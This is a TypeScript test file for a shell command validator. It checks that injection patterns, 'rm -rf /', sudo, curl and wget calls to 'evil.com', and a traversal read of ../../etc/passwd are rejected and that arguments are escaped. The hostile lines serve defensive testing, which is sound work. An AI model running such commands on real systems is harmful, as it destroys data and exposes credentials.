import { CommandValidator, SecurityError } from '../src/security/validator';

describe('CommandValidator', () => {
  describe('validateCommand', () => {
    it('should accept safe commands', () => {
      expect(() => CommandValidator.validateCommand('ls -la')).not.toThrow();
      expect(() => CommandValidator.validateCommand('echo hello')).not.toThrow();
      expect(() => CommandValidator.validateCommand('cat file.txt')).not.toThrow();
      expect(() => CommandValidator.validateCommand('grep pattern file')).not.toThrow();
    });

    it('should reject empty commands', () => {
      expect(() => CommandValidator.validateCommand('')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('   ')).toThrow(SecurityError);
    });

    it('should reject commands with dangerous patterns', () => {
      expect(() => CommandValidator.validateCommand('echo test; rm file')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('echo test && rm file')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('echo test | rm file')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('echo `whoami`')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('echo $(whoami)')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('echo test > file')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('echo test < file')).toThrow(SecurityError);
    });

    it('should allow parameter substitution with $', () => {
      expect(() => CommandValidator.validateCommand('echo $message')).not.toThrow();
      expect(() => CommandValidator.validateCommand('echo ${message}')).not.toThrow();
      expect(() => CommandValidator.validateCommand('ls $path')).not.toThrow();
    });

    it('should reject dangerous commands', () => {
      expect(() => CommandValidator.validateCommand('rm -rf /')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('sudo ls')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('curl http://evil.com')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('wget http://evil.com')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('shutdown now')).toThrow(SecurityError);
    });

    it('should reject commands with directory traversal', () => {
      expect(() => CommandValidator.validateCommand('cat ../../etc/passwd')).toThrow(SecurityError);
      expect(() => CommandValidator.validateCommand('ls ../../../')).toThrow(SecurityError);
    });

    it('should reject commands with null bytes', () => {
      expect(() => CommandValidator.validateCommand('echo test\x00')).toThrow(SecurityError);
    });
  });

  describe('validateArgument', () => {
    it('should accept safe arguments', () => {
      expect(() => CommandValidator.validateArgument('test.txt')).not.toThrow();
      expect(() => CommandValidator.validateArgument('hello world')).not.toThrow();
      expect(() => CommandValidator.validateArgument('123')).not.toThrow();
    });

    it('should reject non-string arguments', () => {
      expect(() => CommandValidator.validateArgument(123 as any)).toThrow(SecurityError);
      expect(() => CommandValidator.validateArgument(null as any)).toThrow(SecurityError);
      expect(() => CommandValidator.validateArgument(undefined as any)).toThrow(SecurityError);
    });

    it('should reject arguments with dangerous patterns', () => {
      expect(() => CommandValidator.validateArgument('test; rm file')).toThrow(SecurityError);
      expect(() => CommandValidator.validateArgument('test && rm file')).toThrow(SecurityError);
      expect(() => CommandValidator.validateArgument('test | rm file')).toThrow(SecurityError);
      expect(() => CommandValidator.validateArgument('`whoami`')).toThrow(SecurityError);
      expect(() => CommandValidator.validateArgument('$(whoami)')).toThrow(SecurityError);
    });

    it('should allow $ in arguments for parameter substitution', () => {
      expect(() => CommandValidator.validateArgument('$message')).not.toThrow();
      expect(() => CommandValidator.validateArgument('${message}')).not.toThrow();
    });
  });

  describe('sanitizeArgument', () => {
    it('should escape shell metacharacters', () => {
      expect(CommandValidator.sanitizeArgument('test;rm')).toBe('test\\;rm');
      expect(CommandValidator.sanitizeArgument('test&rm')).toBe('test\\&rm');
      expect(CommandValidator.sanitizeArgument('test|rm')).toBe('test\\|rm');
      expect(CommandValidator.sanitizeArgument('test`rm')).toBe('test\\`rm');
      expect(CommandValidator.sanitizeArgument('test$rm')).toBe('test$rm'); // $ should not be escaped
      expect(CommandValidator.sanitizeArgument('test(rm)')).toBe('test\\(rm\\)');
      expect(CommandValidator.sanitizeArgument('test<rm>')).toBe('test\\<rm\\>');
    });

    it('should not modify safe arguments', () => {
      expect(CommandValidator.sanitizeArgument('test.txt')).toBe('test.txt');
      expect(CommandValidator.sanitizeArgument('hello world')).toBe('hello world');
      expect(CommandValidator.sanitizeArgument('123')).toBe('123');
    });
  });
});
